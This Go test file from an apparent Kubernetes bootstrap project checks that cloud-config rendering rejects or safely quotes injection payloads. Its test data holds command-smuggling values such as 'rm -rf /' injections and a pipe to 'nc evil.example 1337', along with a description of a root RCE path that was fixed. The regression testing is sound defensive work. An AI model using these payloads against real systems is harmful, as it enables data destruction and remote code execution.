/*
Copyright 2024 The Kairos CAPI Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
implied. See the License for the specific language governing
permissions and limitations under the License.
*/

package bootstrap

import (
	"strings"
	"testing"

	yaml "gopkg.in/yaml.v3"
)

// TestValidateProviderID_PositiveCases asserts that every real-world
// ProviderID we accept from upstream infrastructure providers is allowed
// by the validator. If any of these starts failing, the regex needs to be
// relaxed — but only with a documented reason.
func TestValidateProviderID_PositiveCases(t *testing.T) {
	cases := []struct {
		name string
		id   string
	}{
		{"empty (workers, pre-providerID)", ""},
		{"vsphere uuid", "vsphere://422fa74a-5d60-3a4a-af24-1f07be515fcc"},
		{"kubevirt namespaced", "kubevirt://default/vm-name-0"},
		{"kubevirt complex name", "kubevirt://ns-1/pool.vm-controlplane-0"},
		{"docker", "docker:///kind-cluster-control-plane"},
		{"aws", "aws:///us-east-1a/i-0123456789abcdef0"},
		{"gce", "gce://my-project/us-central1-a/instance-name"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateProviderID(tc.id); err != nil {
				t.Fatalf("ValidateProviderID(%q): unexpected error: %v", tc.id, err)
			}
		})
	}
}

// TestValidateProviderID_RejectsInjection is the heart of KD-2: the validator
// MUST reject every shell-injection payload that would otherwise execute as
// root at first boot. ProviderID is interpolated into a shell `printf`/`echo`
// inside a systemd ExecStartPre directive in the rendered cloud-config; any
// character that escapes the shell context here is RCE.
func TestValidateProviderID_RejectsInjection(t *testing.T) {
	cases := []struct {
		name string
		id   string
	}{
		{"shell escape via double quote", `vsphere://abc"; rm -rf /; echo "`},
		{"json escape", `vsphere://abc"},"evil":"yes`},
		{"command substitution", "vsphere://abc$(rm -rf /)"},
		{"backtick command substitution", "vsphere://abc`rm -rf /`"},
		{"newline", "vsphere://abc\nrm -rf /"},
		{"semicolon", "vsphere://abc; rm -rf /"},
		{"pipe", "vsphere://abc | nc evil.example 1337"},
		{"single quote", "vsphere://abc'OR'1'='1"},
		{"yaml block break", "vsphere://abc\n---\n: bad"},
		{"missing scheme", "no-scheme-here"},
		{"scheme starts with digit", "1bad://value"},
		{"empty path", "vsphere://"},
		{"trailing whitespace", "vsphere://abc "},
		{"leading whitespace", " vsphere://abc"},
		{"NUL byte", "vsphere://abc\x00bad"},
		{"BEL byte", "vsphere://abc\x07bad"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateProviderID(tc.id); err == nil {
				t.Fatalf("ValidateProviderID(%q): expected rejection, got nil", tc.id)
			}
		})
	}
}

// TestRenderRejectsBadProviderID asserts the renderer itself refuses to emit
// userdata with an invalid ProviderID. This is the defense-in-depth guarantee
// the cloudconfig-rendering-safety skill calls for: validation in the
// webhook/controller, AND at render time.
func TestRenderRejectsBadProviderID(t *testing.T) {
	data := TemplateData{
		Role:       "control-plane",
		SingleNode: true,
		UserName:   "kairos",
		ProviderID: `vsphere://abc"; rm -rf /; echo "`,
	}
	if _, err := RenderK0sCloudConfig(data); err == nil {
		t.Errorf("RenderK0sCloudConfig with injection payload: expected error, got nil")
	}
	if _, err := RenderK3sCloudConfig(data); err == nil {
		t.Errorf("RenderK3sCloudConfig with injection payload: expected error, got nil")
	}
}

// adversarialPayloads covers YAML-injection payloads every escaped scalar
// field must survive. The test renders, parses the rendered YAML back, and
// asserts the field round-trips to the original input — proving no metachar
// escaped its scalar.
//
// Payloads that contain `\n`, `\r`, or NUL are deliberately NOT in this map:
// validateTemplateData rejects them outright (see controlCharPayloads below).
// They would otherwise force yaml.v3 into a block-scalar form that doesn't
// re-embed safely into the surrounding template.
var adversarialPayloads = map[string]string{
	"trailing colon":        "foo:",
	"colon space":           "foo: bar",
	"colon space hash":      "foo: # comment",
	"yaml flow mapping":     "{evil: true}",
	"shell metas":           `"; rm -rf /; echo "`,
	"bool-y value (true)":   "true",
	"bool-y value (yes)":    "yes",
	"int-y value":           "12345",
	"null-y value":          "null",
	"backslash and quote":   `\"\\`,
	"unicode":               "héllo-wörld",
	"leading dash":          "-dash-prefix",
	"leading hash":          "#commenty",
	"tab character":         "foo\tbar",
	"single quote":          "it's a test",
	"yaml anchor character": "&anchor",
	"yaml alias character":  "*alias",
}

// controlCharPayloads MUST be rejected by validateTemplateData. These are the
// characters that break either (a) the surrounding YAML's block-scalar /
// list-item indentation contract or (b) shell quoting in the file-content
// block scalars where some fields are also embedded.
var controlCharPayloads = map[string]string{
	"newline injection":    "foo\nshell: /bin/sh",
	"crlf newline":         "foo\r\nbar",
	"yaml doc separator":   "---\nevil: true",
	"NUL byte":             "foo\x00bar",
	"bare carriage return": "foo\rbar",
}

// TestRender_AdversarialHostname checks that a malicious Hostname produces
// well-formed YAML that round-trips to the original value, for both
// distributions on both infra paths.
func TestRender_AdversarialHostname(t *testing.T) {
	for name, payload := range adversarialPayloads {
		for _, isKV := range []bool{false, true} {
			for _, dist := range []string{"k0s", "k3s"} {
				caseName := name + "/" + dist
				if isKV {
					caseName += "/capk"
				} else {
					caseName += "/capv"
				}
				t.Run(caseName, func(t *testing.T) {
					data := TemplateData{
						Role:       "control-plane",
						SingleNode: true,
						Hostname:   payload,
						UserName:   "kairos",
						IsKubeVirt: isKV,
					}
					out, err := renderForDist(dist, data)
					if err != nil {
						t.Fatalf("render: %v", err)
					}
					assertHostnameRoundTrips(t, out, payload)
				})
			}
		}
	}
}

// TestRender_AdversarialUserPassword checks that a malicious UserPassword
// (the most likely user-controlled secret) does not break the YAML or leak
// across into a sibling key. We assert YAML validity and that the password
// round-trips on the first user entry.
func TestRender_AdversarialUserPassword(t *testing.T) {
	for name, payload := range adversarialPayloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:         "control-plane",
				SingleNode:   true,
				Hostname:     "host",
				UserName:     "kairos",
				UserPassword: payload,
			}
			out, err := RenderK0sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			assertUserPasswordRoundTrips(t, out, payload)
		})
	}
}

// TestRender_AdversarialUserGroups checks the slice-quoting path: a malicious
// group name must not collapse a list item into a mapping.
func TestRender_AdversarialUserGroups(t *testing.T) {
	for name, payload := range adversarialPayloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:         "control-plane",
				SingleNode:   true,
				Hostname:     "host",
				UserName:     "kairos",
				UserPassword: "ok",
				UserGroups:   []string{"admin", payload},
			}
			out, err := RenderK0sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			groups := firstUserGroups(t, out)
			if len(groups) != 2 {
				t.Fatalf("expected 2 groups, got %d: %#v", len(groups), groups)
			}
			if groups[0] != "admin" || groups[1] != payload {
				t.Errorf("groups did not round-trip: got %#v, want [admin, %q]", groups, payload)
			}
		})
	}
}

// TestRender_AdversarialDNSServers checks the DNS list-quoting path.
func TestRender_AdversarialDNSServers(t *testing.T) {
	for name, payload := range adversarialPayloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:         "control-plane",
				SingleNode:   true,
				Hostname:     "host",
				UserName:     "kairos",
				UserPassword: "ok",
				DNSServers:   []string{"1.1.1.1", payload},
			}
			out, err := RenderK0sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			// Output must parse as YAML — that's enough for the list case.
			var doc map[string]any
			if err := yaml.Unmarshal([]byte(stripCloudConfigHeader(out)), &doc); err != nil {
				t.Fatalf("rendered YAML did not parse: %v\n---\n%s", err, out)
			}
		})
	}
}

// TestRender_RejectsControlChars asserts that the render-time validator
// refuses to emit userdata when any string field contains a forbidden
// control character (newline, CR, NUL). These would otherwise either inject
// extra YAML keys or break the block-scalar embed of fields that also appear
// inside file-content / shell contexts.
//
// We exercise the rejection on several field types to confirm the generic
// rejectControlChars rule fires uniformly.
func TestRender_RejectsControlChars(t *testing.T) {
	for name, payload := range controlCharPayloads {
		t.Run("Hostname/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: payload, UserName: "kairos"}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("Hostname=%q: expected render error, got nil", payload)
			}
		})
		t.Run("UserPassword/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: "h", UserName: "kairos", UserPassword: payload}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("UserPassword=%q: expected render error, got nil", payload)
			}
		})
		t.Run("WorkerToken/"+name, func(t *testing.T) {
			data := TemplateData{Role: "worker", Hostname: "h", UserName: "kairos", WorkerToken: payload}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("WorkerToken=%q: expected render error, got nil", payload)
			}
		})
		t.Run("UserGroups/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: "h", UserName: "kairos", UserGroups: []string{"admin", payload}}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("UserGroups[1]=%q: expected render error, got nil", payload)
			}
		})
		t.Run("DNSServers/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: "h", UserName: "kairos", DNSServers: []string{"1.1.1.1", payload}}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("DNSServers[1]=%q: expected render error, got nil", payload)
			}
		})
	}
}

// TestPersistencyBlockDoesNotLeakUserInput asserts the persistency
// write_files entry (KD-23) is content-static — no user-controlled string
// from TemplateData can appear inside the persistency subtree of the
// rendered cloud-config.
//
// The block is supposed to be a compile-time constant (see persistency.go's
// SECURITY notes) and its template-func is zero-arg, but the safety story
// breaks if a future template edit accidentally interpolates a user field
// into the wrong YAML scope and yip then expands PERSISTENT_STATE_PATHS to
// include a user-controlled directory. This test renders with adversarial
// markers in every user-controlled string field and then asserts none of
// those markers appear anywhere inside the persistency entry's `content`.
func TestPersistencyBlockDoesNotLeakUserInput(t *testing.T) {
	// Distinct sentinel strings so a leak names the exact field that bled
	// through. The values are chosen to be plain ASCII (no `\n`/`\r`/NUL
	// which validateTemplateData rejects) yet implausible as accidental
	// matches against any path in expectedPersistentStatePaths.
	const (
		hostnameMark       = "ADV-HOSTNAME-LEAK"
		userNameMark       = "ADV-USERNAME-LEAK"
		userPasswordMark   = "ADV-USERPASSWORD-LEAK"
		workerTokenMark    = "ADV-WORKERTOKEN-LEAK"
		k3sTokenMark       = "ADV-K3STOKEN-LEAK"
		k3sServerURLMark   = "https://ADV-K3SSERVER-LEAK:6443"
		sshKeyMark         = "ssh-rsa ADV-SSHKEY-LEAK"
		gitHubUserMark     = "ADV-GITHUBUSER-LEAK"
		hostnamePrefixMark = "ADV-HOSTPREFIX-LEAK"
		groupMark          = "ADV-GROUP-LEAK"
		dnsMark            = "203.0.113.7"
		podCIDRMark        = "203.0.113.8/24"
		serviceCIDRMark    = "203.0.113.16/28"
		primaryIPMark      = "203.0.113.9"
		machineNameMark    = "ADV-MACHINE-LEAK"
		clusterNSMark      = "ADV-CLUSTERNS-LEAK"
		lbServiceNameMark  = "ADV-LBNAME-LEAK"
		lbServiceNSMark    = "ADV-LBNS-LEAK"
		lbEndpointMark     = "203.0.113.10"
		mgmtTokenMark      = "ADV-MGMTTOKEN-LEAK"
		mgmtSecretNameMark = "ADV-MGMTSECRET-LEAK"
		mgmtSecretNSMark   = "ADV-MGMTNS-LEAK"
		mgmtAPIServerMark  = "https://ADV-MGMTAPI-LEAK:6443"
	)

	allMarks := []string{
		hostnameMark, userNameMark, userPasswordMark, workerTokenMark,
		k3sTokenMark, k3sServerURLMark, sshKeyMark, gitHubUserMark,
		hostnamePrefixMark, groupMark, dnsMark, podCIDRMark, serviceCIDRMark,
		primaryIPMark, machineNameMark, clusterNSMark, lbServiceNameMark,
		lbServiceNSMark, lbEndpointMark, mgmtTokenMark, mgmtSecretNameMark,
		mgmtSecretNSMark, mgmtAPIServerMark,
	}

	mkData := func(isKV bool, dist string) TemplateData {
		d := TemplateData{
			Role:                           "control-plane",
			SingleNode:                     true,
			Hostname:                       hostnameMark,
			UserName:                       userNameMark,
			UserPassword:                   userPasswordMark,
			UserGroups:                     []string{groupMark},
			GitHubUser:                     gitHubUserMark,
			SSHPublicKey:                   sshKeyMark,
			HostnamePrefix:                 hostnamePrefixMark,
			DNSServers:                     []string{dnsMark},
			PodCIDR:                        podCIDRMark,
			ServiceCIDR:                    serviceCIDRMark,
			PrimaryIP:                      primaryIPMark,
			MachineName:                    machineNameMark,
			ClusterNS:                      clusterNSMark,
			IsKubeVirt:                     isKV,
			ControlPlaneLBServiceName:      lbServiceNameMark,
			ControlPlaneLBServiceNamespace: lbServiceNSMark,
			ControlPlaneLBEndpoint:         lbEndpointMark,
			ManagementEndpoint: &ManagementEndpoint{
				Token:                     mgmtTokenMark,
				KubeconfigSecretName:      mgmtSecretNameMark,
				KubeconfigSecretNamespace: mgmtSecretNSMark,
				APIServer:                 mgmtAPIServerMark,
			},
		}
		if dist == "k3s" {
			// k3s control-plane templates don't read WorkerToken (workers
			// only); set K3sToken so the field is still exercised on the
			// worker-template-share path. Use a control-plane role here so
			// the persistency block renders; set K3sToken anyway as a
			// belt-and-braces check that even an unused-in-this-role field
			// doesn't leak.
			d.K3sToken = k3sTokenMark
			d.K3sServerURL = k3sServerURLMark
		} else {
			d.WorkerToken = workerTokenMark
		}
		return d
	}

	for _, dist := range []string{"k0s", "k3s"} {
		for _, isKV := range []bool{false, true} {
			tag := dist
			if isKV {
				tag += "/capk"
			} else {
				tag += "/capv"
			}
			t.Run(tag, func(t *testing.T) {
				out, err := renderForDist(dist, mkData(isKV, dist))
				if err != nil {
					t.Fatalf("render failed: %v", err)
				}

				// Walk the rendered YAML to the persistency entry's inner content.
				doc := parseRendered(t, out)
				rawWF, ok := doc["write_files"].([]any)
				if !ok {
					t.Fatalf("write_files missing or not a list")
				}
				const wantPath = "/system/oem/12_kairos-capi-persistency.yaml"
				var content string
				for _, raw := range rawWF {
					e, ok := raw.(map[string]any)
					if !ok {
						continue
					}
					if p, _ := e["path"].(string); p == wantPath {
						content, _ = e["content"].(string)
						break
					}
				}
				if content == "" {
					t.Fatalf("persistency entry with path=%q not found or content empty", wantPath)
				}

				// None of the adversarial markers may appear inside the
				// persistency content. (We assert on the raw content string
				// rather than the parsed inner doc to catch leaks even into
				// YAML comments or structurally-broken regions.)
				for _, mark := range allMarks {
					if strings.Contains(content, mark) {
						t.Errorf("user-controlled value %q leaked into persistency block content", mark)
					}
				}
			})
		}
	}
}

// TestHostnameShellInjection_K3sCAPK_ProviderID is the regression guard for
// KD-43. The k3s CAPK template's VM self-discovery script interpolates the
// user-controlled .Hostname into a PROVIDER_ID shell assignment. Before the
// fix, the line was:
//
//	PROVIDER_ID="kubevirt://{{ .Hostname }}"
//
// which is a double-quoted shell-string-literal context. An attacker who can
// create or update a KairosConfig could set Hostname to (e.g.)
//
//	foo"; rm -rf /; echo "
//
// and obtain RCE as root at first boot — validateTemplateData only rejects
// `\n\r\x00`, not shell metacharacters. The fix concatenates a static
// double-quoted prefix with the shquote'd Hostname so any embedded `"` or
// shell metas are literally quoted by POSIX single quotes.
//
// This test renders the k3s CAPK template with adversarial Hostname payloads
// that DO inject shell metas (but do NOT contain `\n`/`\r`/NUL, which
// validateTemplateData rejects before render) and asserts:
//
//  1. The rendered YAML still parses.
//  2. The PROVIDER_ID line in /usr/local/bin/kairos-k3s-discover-provider-id.sh
//     contains the payload bracketed by `'...'` (the shquote envelope),
//     never unescaped.
//  3. Dangerous fragments inside the payload never appear unquoted.
//
// The k3s CAPV, k0s CAPV, and k0s CAPK templates do NOT embed Hostname in a
// shell context (the only other appearances are YAML block-scalar file
// contents written to /usr/local/etc/hostname, which is `cat`'d at runtime —
// the validator's `\n`/`\r`/NUL reject keeps that contract intact), so this
// test is intentionally scoped to k3s CAPK.
func TestHostnameShellInjection_K3sCAPK_ProviderID(t *testing.T) {
	payloads := map[string]string{
		"double_quote_break": `foo"; rm -rf /; echo "`,
		"command_subst":      `host$(rm -rf /)`,
		"backtick":           "host`rm -rf /`",
		"semicolon_and_and":  `host'; rm -rf /; && echo '`,
		"single_quote_break": `host'; rm -rf /; echo '`,
	}

	for name, payload := range payloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:       "control-plane",
				SingleNode: true,
				Hostname:   payload,
				UserName:   "kairos",
				IsKubeVirt: true,
				// Leave ProviderID empty so the self-discovery script
				// (which is where the Hostname interpolation lives) renders.
			}
			out, err := RenderK3sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}

			// (1) YAML must still parse.
			var doc map[string]any
			if err := yaml.Unmarshal([]byte(stripCloudConfigHeader(out)), &doc); err != nil {
				t.Fatalf("rendered YAML did not parse: %v\n---OUTPUT---\n%s", err, out)
			}

			// (2) The PROVIDER_ID assignment line must appear, and the
			// payload must appear wrapped in the shquote envelope. The
			// expected line shape is:
			//   PROVIDER_ID="kubevirt://"'<shquoted-payload>'
			envelope := shquote(payload)
			wantLine := `PROVIDER_ID="kubevirt://"` + envelope
			if !strings.Contains(out, wantLine) {
				t.Fatalf("PROVIDER_ID assignment not found in expected shquoted form\nwant substring: %q\n---OUTPUT---\n%s", wantLine, out)
			}

			// (3) On the PROVIDER_ID line specifically, dangerous fragments
			// must only appear within the shquote envelope. We restrict to
			// the line because the payload also appears (safely) in the YAML
			// hostname scalar at the top of the document, where the
			// surrounding context is YAML-double-quoted rather than
			// shell-single-quoted; that's a different escape contract and
			// is not the regression site KD-43 covers.
			//
			// Locate the line beginning `PROVIDER_ID="kubevirt://"` and
			// extract just that line to perform the walk on.
			marker := `PROVIDER_ID="kubevirt://"`
			lineStart := strings.Index(out, marker)
			if lineStart < 0 {
				t.Fatalf("PROVIDER_ID assignment line not found in output\n---OUTPUT---\n%s", out)
			}
			lineEnd := strings.Index(out[lineStart:], "\n")
			if lineEnd < 0 {
				lineEnd = len(out) - lineStart
			}
			providerIDLine := out[lineStart : lineStart+lineEnd]

			for _, dangerous := range []string{
				"; rm -rf /",
				"$(rm -rf /)",
				"`rm -rf /`",
			} {
				if !strings.Contains(payload, dangerous) {
					continue
				}
				idx := 0
				for {
					pos := strings.Index(providerIDLine[idx:], dangerous)
					if pos < 0 {
						break
					}
					absPos := idx + pos
					before := providerIDLine[:absPos]
					lastOpen := strings.LastIndex(before, "'")
					if lastOpen < 0 {
						t.Fatalf("dangerous fragment %q at PROVIDER_ID-line offset %d has no preceding `'` — not inside shquote envelope\nLINE: %s", dangerous, absPos, providerIDLine)
					}
					after := providerIDLine[absPos+len(dangerous):]
					nextClose := strings.Index(after, "'")
					if nextClose < 0 {
						t.Fatalf("dangerous fragment %q at PROVIDER_ID-line offset %d has no closing `'` after it — not inside shquote envelope\nLINE: %s", dangerous, absPos, providerIDLine)
					}
					idx = absPos + len(dangerous)
				}
			}
		})
	}
}

// TestSafeIndent_CRLF asserts the indent function strips \r so Windows-authored
// Manifest.Content doesn't leak \r into the YAML block scalar (which would
// then propagate into files written on the node).
func TestSafeIndent_CRLF(t *testing.T) {
	in := "line1\r\nline2\r\nline3"
	out := safeIndent(2, in)
	if strings.Contains(out, "\r") {
		t.Errorf("safeIndent leaked \\r: %q", out)
	}
	want := "  line1\n  line2\n  line3"
	if out != want {
		t.Errorf("safeIndent CRLF result: got %q, want %q", out, want)
	}
}

// --- helpers ---

func renderForDist(dist string, data TemplateData) (string, error) {
	if dist == "k0s" {
		return RenderK0sCloudConfig(data)
	}
	return RenderK3sCloudConfig(data)
}

// stripCloudConfigHeader removes the leading `#cloud-config` marker so the
// remaining text can be parsed as a single YAML document.
func stripCloudConfigHeader(s string) string {
	for _, prefix := range []string{"#cloud-config\n", "#cloud-config\r\n"} {
		if strings.HasPrefix(s, prefix) {
			return strings.TrimPrefix(s, prefix)
		}
	}
	return s
}

func parseRendered(t *testing.T, out string) map[string]any {
	t.Helper()
	var doc map[string]any
	if err := yaml.Unmarshal([]byte(stripCloudConfigHeader(out)), &doc); err != nil {
		t.Fatalf("rendered YAML did not parse: %v\n---\n%s", err, out)
	}
	return doc
}

func assertHostnameRoundTrips(t *testing.T, out, want string) {
	t.Helper()
	doc := parseRendered(t, out)
	got, ok := doc["hostname"].(string)
	if !ok {
		// hostname is omitted only when both Hostname and HostnamePrefix are empty.
		// Our tests always set Hostname, so a missing or non-string value is a bug.
		t.Fatalf("hostname missing or not a string: %T %#v", doc["hostname"], doc["hostname"])
	}
	if got != want {
		t.Errorf("hostname did not round-trip:\n got: %q\nwant: %q", got, want)
	}
}

// assertUserPasswordRoundTrips finds the first non-`capk` user in `users:`
// and asserts its passwd field matches `want`.
func assertUserPasswordRoundTrips(t *testing.T, out, want string) {
	t.Helper()
	users := allUsers(t, out)
	for _, u := range users {
		if name, _ := u["name"].(string); name == "capk" {
			continue
		}
		got, ok := u["passwd"].(string)
		if !ok {
			t.Fatalf("first non-capk user has no string passwd: %#v", u)
		}
		if got != want {
			t.Errorf("user passwd did not round-trip:\n got: %q\nwant: %q", got, want)
		}
		return
	}
	t.Fatalf("no non-capk user found in users[] (parsed: %#v)", users)
}

// firstUserGroups returns the groups slice from the first non-capk user entry.
func firstUserGroups(t *testing.T, out string) []string {
	t.Helper()
	users := allUsers(t, out)
	for _, u := range users {
		if name, _ := u["name"].(string); name == "capk" {
			continue
		}
		raw, _ := u["groups"].([]any)
		groups := make([]string, 0, len(raw))
		for _, g := range raw {
			s, _ := g.(string)
			groups = append(groups, s)
		}
		return groups
	}
	t.Fatalf("no non-capk user found in users[] (parsed: %#v)", users)
	return nil
}

func allUsers(t *testing.T, out string) []map[string]any {
	t.Helper()
	doc := parseRendered(t, out)
	rawUsers, ok := doc["users"].([]any)
	if !ok {
		t.Fatalf("users[] missing or not a list: %T %#v", doc["users"], doc["users"])
	}
	users := make([]map[string]any, 0, len(rawUsers))
	for _, u := range rawUsers {
		m, _ := u.(map[string]any)
		users = append(users, m)
	}
	return users
}

// TestShquote_Unit asserts the POSIX single-quoting helper produces values
// that bash cannot interpret. The contract is:
//   - return value INCLUDES the surrounding single quotes;
//   - embedded single quotes are escaped via the standard '\” close-open trick;
//   - no other character receives special treatment — `$`, backticks, `;`,
//     `&&`, `|`, `(` `)`, etc. are emitted verbatim and rely on the
//     single-quoting to keep bash from interpreting them.
func TestShquote_Unit(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"empty", "", `''`},
		{"plain", "hello", `'hello'`},
		{"single_quote", "a'b", `'a'\''b'`},
		{"double_quote", `a"b`, `'a"b'`},
		{"dollar_subshell", "a$(rm -rf /)b", `'a$(rm -rf /)b'`},
		{"backtick", "a`rm`b", "'a`rm`b'"},
		{"semicolon", "a; rm -rf /", `'a; rm -rf /'`},
		{"pipe_and", "a && evil", `'a && evil'`},
		{"shell_redirect", "a > /tmp/x", `'a > /tmp/x'`},
		{"glob", "a*b", `'a*b'`},
		{"injection_close_then_evil", `'; rm -rf /; echo '`, `''\''; rm -rf /; echo '\'''`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := shquote(tc.in)
			if got != tc.want {
				t.Errorf("shquote(%q) = %q; want %q", tc.in, got, tc.want)
			}
		})
	}
}

// shquoteCAPKAdversarialFields enumerates the 6 TemplateData fields that
// land in shell-context positions in the CAPK templates (k0s + k3s). For
// each, we render the two CAPK template variants with an adversarial
// payload that injects shell metacharacters, then assert:
//
//  1. The rendered output is still parseable as YAML.
//  2. The adversarial payload appears wrapped in POSIX single quotes
//     (i.e. the shquote envelope).
//  3. The dangerous fragments inside the payload (`; rm -rf /`, `$(rm)`)
//     never appear UNQUOTED in the rendered output. They only ever appear
//     inside a `'...'` envelope.
//
// Inputs without control characters (no `\n`, `\r`, NUL) bypass
// validateTemplateData's reject-list and reach the template, so this test
// exercises the renderer's escaping rather than the validator's.
func TestShquoteFieldsAreShellSafe(t *testing.T) {
	urlInjection := `https://api:6443'; rm -rf /; echo '`
	tokenInjection := `evil-token'; rm -rf /; echo '`
	ipInjection := `1.2.3.4'; rm -rf /; #`
	nameInjection := `evil$(rm -rf /)`

	type fieldCase struct {
		name       string
		payload    string
		applyToK0s func(d *TemplateData)
		applyToK3s func(d *TemplateData)
	}

	cases := []fieldCase{
		{
			name:       "ManagementAPIServer",
			payload:    urlInjection,
			applyToK0s: func(d *TemplateData) { d.ManagementEndpoint.APIServer = urlInjection },
			applyToK3s: func(d *TemplateData) { d.ManagementEndpoint.APIServer = urlInjection },
		},
		{
			name:       "ManagementKubeconfigToken",
			payload:    tokenInjection,
			applyToK0s: func(d *TemplateData) { d.ManagementEndpoint.Token = tokenInjection },
			applyToK3s: func(d *TemplateData) { d.ManagementEndpoint.Token = tokenInjection },
		},
		{
			name:       "PrimaryIP",
			payload:    ipInjection,
			applyToK0s: func(d *TemplateData) { d.PrimaryIP = ipInjection },
			applyToK3s: func(d *TemplateData) { d.PrimaryIP = ipInjection },
		},
		{
			name:       "MachineName",
			payload:    nameInjection,
			applyToK0s: func(d *TemplateData) { d.MachineName = nameInjection },
			applyToK3s: func(d *TemplateData) { d.MachineName = nameInjection },
		},
		{
			name:       "ClusterNS",
			payload:    nameInjection,
			applyToK0s: func(d *TemplateData) { d.ClusterNS = nameInjection },
			applyToK3s: func(d *TemplateData) { d.ClusterNS = nameInjection },
		},
		{
			name:       "ControlPlaneLBEndpoint",
			payload:    urlInjection,
			applyToK0s: func(d *TemplateData) { d.ControlPlaneLBEndpoint = urlInjection },
			applyToK3s: func(d *TemplateData) { d.ControlPlaneLBEndpoint = urlInjection },
		},
	}

	baseK0s := func() TemplateData {
		return TemplateData{
			Role:         "control-plane",
			SingleNode:   true,
			UserName:     "kairos",
			UserPassword: "kairos",
			UserGroups:   []string{"admin"},
			IsKubeVirt:   true,
			ManagementEndpoint: &ManagementEndpoint{ // non-nil → push block renders
				Token:                     "test-token",
				KubeconfigSecretName:      "cluster-kubeconfig",
				KubeconfigSecretNamespace: "default",
				APIServer:                 "https://1.2.3.4:6443",
			},
		}
	}
	baseK3s := func() TemplateData {
		return TemplateData{
			Role:         "control-plane",
			SingleNode:   true,
			UserName:     "kairos",
			UserPassword: "kairos",
			UserGroups:   []string{"admin"},
			IsKubeVirt:   true,
			ManagementEndpoint: &ManagementEndpoint{
				Token:                     "test-token",
				KubeconfigSecretName:      "cluster-kubeconfig",
				KubeconfigSecretNamespace: "default",
				APIServer:                 "https://1.2.3.4:6443",
			},
		}
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			for _, dist := range []struct {
				name   string
				render func() (string, error)
			}{
				{
					name: "k0s",
					render: func() (string, error) {
						d := baseK0s()
						tc.applyToK0s(&d)
						return RenderK0sCloudConfig(d)
					},
				},
				{
					name: "k3s",
					render: func() (string, error) {
						d := baseK3s()
						tc.applyToK3s(&d)
						return RenderK3sCloudConfig(d)
					},
				},
			} {
				t.Run(dist.name, func(t *testing.T) {
					out, err := dist.render()
					if err != nil {
						t.Fatalf("render: %v", err)
					}

					// (1) YAML must still parse.
					var doc map[string]any
					if err := yaml.Unmarshal([]byte(out), &doc); err != nil {
						t.Fatalf("rendered YAML did not parse: %v\n---OUTPUT---\n%s", err, out)
					}

					// (2) Some templates DO embed the field, but only CAPK uses
					// these fields in shell context. If the value is referenced
					// at all, it must be inside POSIX single quotes — i.e. the
					// shquote envelope appears in the output. The shquote of any
					// of our adversarial payloads is non-empty and contains an
					// embedded escape sequence; assert the envelope is present.
					envelope := shquote(tc.payload)
					if !strings.Contains(out, envelope) {
						// It's acceptable for some fields to be unused on a
						// given template variant (e.g. PrimaryIP isn't
						// referenced by the k3s template). Skip the rest of the
						// assertions in that case.
						if !strings.Contains(out, tc.payload) {
							t.Logf("field not referenced in this template variant; skipping")
							return
						}
						t.Fatalf("payload appears in output WITHOUT shquote envelope:\nenvelope=%q\n---OUTPUT---\n%s", envelope, out)
					}

					// (3) Dangerous fragments must never appear UNQUOTED outside
					// the shquote envelope. Walk every occurrence of each
					// fragment and verify it sits inside a single-quoted region.
					for _, dangerous := range []string{
						"; rm -rf /",
						"$(rm -rf /)",
					} {
						if !strings.Contains(tc.payload, dangerous) {
							continue
						}
						// Find each occurrence and confirm it's bracketed by
						// single quotes via the surrounding envelope.
						idx := 0
						for {
							pos := strings.Index(out[idx:], dangerous)
							if pos < 0 {
								break
							}
							absPos := idx + pos
							// Walk backwards: the most recent unescaped single
							// quote before this position must be unmatched
							// (i.e., we're inside `'...'`).
							before := out[:absPos]
							lastOpen := strings.LastIndex(before, "'")
							if lastOpen < 0 {
								t.Fatalf("dangerous fragment %q at offset %d has no preceding `'` — not inside shquote envelope\n---OUTPUT---\n%s", dangerous, absPos, out)
							}
							after := out[absPos+len(dangerous):]
							nextClose := strings.Index(after, "'")
							if nextClose < 0 {
								t.Fatalf("dangerous fragment %q at offset %d has no closing `'` after it — not inside shquote envelope\n---OUTPUT---\n%s", dangerous, absPos, out)
							}
							idx = absPos + len(dangerous)
						}
					}
				})
			}
		})
	}
}
